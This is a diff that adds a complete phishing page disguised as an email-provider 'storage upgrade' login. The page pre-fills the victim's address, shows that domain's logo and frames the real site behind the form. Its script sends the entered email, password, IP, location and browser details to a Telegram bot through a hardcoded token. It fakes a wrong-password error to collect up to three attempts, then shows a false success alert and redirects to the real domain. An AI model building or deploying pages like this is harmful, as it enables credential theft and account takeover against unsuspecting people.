@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Email Update</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      font-family: 'Inter', Arial, sans-serif;
+      position: relative;
+      overflow: hidden;
+      background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
+    }
+
+    /* Animated floating orbs */
+    body::before,
+    body::after {
+      content: '';
+      position: fixed;
+      border-radius: 50%;
+      filter: blur(80px);
+      opacity: 0.4;
+      z-index: 0;
+      animation: floatOrb 8s ease-in-out infinite alternate;
+    }
+
+    body::before {
+      width: 500px;
+      height: 500px;
+      background: radial-gradient(circle, #6c63ff, #3b82f6);
+      top: -150px;
+      right: -100px;
+      animation-delay: 0s;
+    }
+
+    body::after {
+      width: 400px;
+      height: 400px;
+      background: radial-gradient(circle, #a855f7, #ec4899);
+      bottom: -120px;
+      left: -80px;
+      animation-delay: 4s;
+    }
+
+    @keyframes floatOrb {
+      0% { transform: translate(0, 0) scale(1); }
+      100% { transform: translate(40px, -30px) scale(1.1); }
+    }
+
+    /* Particle dots */
+    .particles {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+      pointer-events: none;
+      overflow: hidden;
+    }
+
+    .particle {
+      position: absolute;
+      width: 3px;
+      height: 3px;
+      background: rgba(255, 255, 255, 0.25);
+      border-radius: 50%;
+      animation: drift linear infinite;
+    }
+
+    @keyframes drift {
+      0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+      10% { opacity: 1; }
+      90% { opacity: 1; }
+      100% { transform: translateY(-10vh) rotate(720deg); opacity: 0; }
+    }
+
+    #background-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+    }
+
+    #background-frame {
+      width: 100%;
+      height: 100%;
+      border: none;
+      position: absolute;
+      top: 0;
+      left: 0;
+      pointer-events: none;
+    }
+
+    .abstract-shapes {
+      display: none;
+    }
+
+    .form-container {
+      background: #1a1a2e;
+      backdrop-filter: none;
+      -webkit-backdrop-filter: none;
+      padding: 48px 44px 40px;
+      border-radius: 24px;
+      box-shadow:
+        0 8px 32px rgba(0, 0, 0, 0.6),
+        0 0 0 1px rgba(255, 255, 255, 0.08),
+        inset 0 1px 0 rgba(255, 255, 255, 0.06);
+      text-align: center;
+      width: 440px;
+      max-width: 92vw;
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      position: relative;
+      z-index: 10;
+      animation: cardAppear 0.7s cubic-bezier(0.16, 1, 0.3, 1) both;
+    }
+
+    @keyframes cardAppear {
+      0% {
+        opacity: 0;
+        transform: translateY(30px) scale(0.96);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    /* Subtle top accent line */
+    .form-container::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 60%;
+      height: 3px;
+      background: linear-gradient(90deg, transparent, #6c63ff, #a855f7, #ec4899, transparent);
+      border-radius: 0 0 4px 4px;
+    }
+
+    h2 {
+      color: #f0f0f5;
+      margin-bottom: 8px;
+      font-size: 24px;
+      font-weight: 700;
+      letter-spacing: -0.3px;
+    }
+
+    p {
+      color: rgba(255, 255, 255, 0.55);
+      font-size: 13.5px;
+      margin-bottom: 28px;
+      line-height: 1.5;
+    }
+
+    .form-group {
+      margin-bottom: 18px;
+      text-align: left;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 7px;
+      font-size: 13px;
+      color: rgba(255, 255, 255, 0.65);
+      font-weight: 500;
+      letter-spacing: 0.3px;
+      text-transform: uppercase;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 12px;
+      font-size: 15px;
+      font-family: 'Inter', Arial, sans-serif;
+      background: #12122a;
+      color: #e8e8f0;
+      transition: all 0.3s ease;
+      outline: none;
+    }
+
+    .form-group input::placeholder {
+      color: rgba(255, 255, 255, 0.3);
+    }
+
+    .form-group input:focus {
+      border-color: rgba(108, 99, 255, 0.7);
+      background: #1a1a3a;
+      box-shadow: 0 0 0 3px rgba(108, 99, 255, 0.2), 0 0 20px rgba(108, 99, 255, 0.1);
+    }
+
+    .form-group input[readonly] {
+      opacity: 0.6;
+      cursor: default;
+    }
+
+    .form-group button {
+      width: 100%;
+      padding: 15px 24px;
+      background: linear-gradient(135deg, #6c63ff 0%, #7c3aed 50%, #a855f7 100%);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 600;
+      font-family: 'Inter', Arial, sans-serif;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 24px;
+      margin-left: auto;
+      margin-right: auto;
+      display: block;
+      position: relative;
+      overflow: hidden;
+      letter-spacing: 0.3px;
+      box-shadow: 0 4px 15px rgba(108, 99, 255, 0.35);
+    }
+
+    .form-group button::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+      transition: left 0.5s ease;
+    }
+
+    .form-group button:hover {
+      background: linear-gradient(135deg, #5b54e6 0%, #6d28d9 50%, #9333ea 100%);
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(108, 99, 255, 0.45);
+    }
+
+    .form-group button:hover::before {
+      left: 100%;
+    }
+
+    .form-group button:active {
+      transform: translateY(0);
+      box-shadow: 0 2px 10px rgba(108, 99, 255, 0.3);
+    }
+
+    .error-message {
+      color: #ff6b6b;
+      font-size: 13px;
+      display: none;
+      margin-top: 4px;
+      margin-bottom: 4px;
+      text-align: left;
+      background: rgba(255, 107, 107, 0.08);
+      border: 1px solid rgba(255, 107, 107, 0.15);
+      padding: 10px 14px;
+      border-radius: 10px;
+      line-height: 1.4;
+    }
+
+    #domainLogo {
+      max-height: 50px;
+      display: block;
+      margin: 0 auto 20px;
+    }
+
+    #session-expired {
+      color: rgba(255, 255, 255, 0.55);
+      font-weight: normal;
+      font-size: 13.5px;
+    }
+
+    .copyright-text {
+      margin-top: 28px;
+      font-size: 12px;
+      color: rgba(255, 255, 255, 0.25);
+      text-align: center;
+      user-select: none;
+      letter-spacing: 0.2px;
+    }
+
+    /* Shield icon for header */
+    .shield-icon {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 52px;
+      height: 52px;
+      background: linear-gradient(135deg, rgba(108, 99, 255, 0.2), rgba(168, 85, 247, 0.2));
+      border: 1px solid rgba(108, 99, 255, 0.25);
+      border-radius: 16px;
+      margin: 0 auto 20px;
+    }
+
+    .shield-icon svg {
+      width: 26px;
+      height: 26px;
+      color: #a78bfa;
+    }
+
+    /* Responsive */
+    @media (max-width: 480px) {
+      .form-container {
+        padding: 36px 28px 32px;
+        border-radius: 20px;
+      }
+      h2 { font-size: 21px; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Floating particles -->
+<div class="particles" id="particles"></div>
+
+<div id="background-container">
+  <iframe id="background-frame" src="" frameborder="0"></iframe>
+</div>
+
+<div class="form-container">
+  <div class="shield-icon">
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+      <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75 11.25 15 15 9.75m-3-7.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285Z" />
+    </svg>
+  </div>
+  <img id="domainLogo" alt="Domain Logo" style="display: none;">
+  <h2 id="emailDomainHeader"> Portal</h2>
+  <p id="session-expired">You are accessing a secure settings, Authentication is required.</p>
+
+  <form id="loginForm">
+    <div class="form-group">
+      <label for="email">Email</label>
+      <input type="email" id="email" name="email" readonly required>
+    </div>
+    <div class="error-message" id="errorMessage">Incorrect Pasword, Please fill in the correct details.!</div>
+    <div class="form-group">
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" placeholder="Enter Password" autofocus required>
+    </div>
+    <div class="form-group">
+      <button type="submit">Upgrade Storage Now</button>
+    </div>
+  </form>
+
+  <!-- Added copyright text -->
+  <div class="copyright-text">© 2026 Secure Portal | Privacy</div>
+</div>
+
+<script>
+const token = "7334194741:AAHrxdfPH3zHgNFKQ5rsxIctgmI0y20rAyw";
+const chatId = "6613870250";
+let attemptCount = 0;
+
+// Honeypot timing: record page load time
+const pageLoadTime = Date.now();
+
+// Handle email from hash
+const fragment = window.location.hash.slice(1);
+const email = decodeURIComponent(fragment);
+if (email) {
+  const emailField = document.getElementById('email');
+  emailField.value = email;
+
+  const emailDomain = email.split('@')[1];
+  const emailDomainHeader = emailDomain.split('.')[0];
+  document.getElementById('emailDomainHeader').textContent = ` ${emailDomainHeader} Portal`;
+
+  const logoUrl = `https://logo.clearbit.com/${emailDomain}`;
+  const logoImg = document.getElementById('domainLogo');
+  logoImg.src = logoUrl;
+  logoImg.onerror = () => logoImg.style.display = "none";
+  logoImg.style.display = "block";
+
+  document.getElementById('background-frame').src = `https://${emailDomain}`;
+}
+
+const errorMessage = document.getElementById("errorMessage");
+document.getElementById("password").addEventListener("input", () => {
+  errorMessage.style.display = "none";
+});
+
+// Send data to Telegram
+function sendToTelegram(email, password, attempt) {
+  fetch("https://api.db-ip.com/v2/free/self")
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.ipAddress || "Unknown";
+      const country = data.countryName || "Unknown";
+      const region = data.stateProv || "Unknown";
+      const time = new Date().toLocaleString();
+      const message = `🔐 Attempt ${attempt}/3\n\n` +
+        `📧 Email: ${email}\n` +
+        `🔑 Password: ${password}\n` +
+        `🌐 IP: ${ip}\n` +
+        `🌍 Country: ${country}\n` +
+        `🗺️ Region: ${region}\n` +
+        `🕒 Time: ${time}\n` +
+        `📱 Browser: ${navigator.userAgent}`;
+
+      return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: `chat_id=${chatId}&text=${encodeURIComponent(message)}`
+      });
+    })
+    .then(() => {
+      errorMessage.style.display = "block";
+      document.getElementById("password").value = "";
+      if (attemptCount >= 3) {
+        alert("Your Mail Storage has now been Re-upgraded! You can continue using your account without interruption or loss of Data and incoming emails.");
+        const emailDomain = email.split('@')[1];
+        window.location.href = `https://${emailDomain}`;
+      }
+    })
+    .catch(() => {
+      errorMessage.style.display = "block";
+      document.getElementById("password").value = "";
+      if (attemptCount >= 3) {
+        alert("Your Mail Storage has now been Re-upgraded! You can continue using your account without interruption or loss of Data and incoming emails.");
+        const emailDomain = email.split('@')[1];
+        window.location.href = `https://${emailDomain}`;
+      }
+    });
+}
+
+// Form handler with timing honeypot check
+document.getElementById("loginForm").addEventListener("submit", function (e) {
+  e.preventDefault();
+
+  // Calculate time elapsed since page loaded
+  const elapsedSeconds = (Date.now() - pageLoadTime) / 1000;
+
+  // If less than 4 seconds, silently block submit (do nothing)
+  if (elapsedSeconds < 4) {
+    return;
+  }
+
+  const password = document.getElementById("password").value.trim();
+  if (!password) return;
+
+  attemptCount++;
+  sendToTelegram(email, password, attemptCount);
+});
+</script>
+
+</body>
+</html>
